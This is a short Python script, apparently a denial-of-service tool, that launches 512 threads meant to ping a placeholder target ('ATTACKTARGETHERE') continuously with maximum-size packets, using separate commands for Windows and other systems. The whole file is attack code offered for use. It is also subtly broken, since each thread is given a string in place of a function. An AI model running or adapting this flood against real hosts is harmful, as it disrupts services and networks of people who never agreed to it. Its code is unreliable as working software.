import os
import threading
def Wping():
    os.system(f"ping ATTACKTARGETHERE -t -l 65500")
def Lping():
    os.system(f"ping ATTACKTARGETHERE -s 65500")
#print("ping spammer??"+(5000*'[]'))
option = 'Lping'
if os.name == 'nt':
    option = 'Wping'
for i in range(512):
    thead = threading.Thread(target=f'{option}',name=f'TH{i}')
    thead.start()
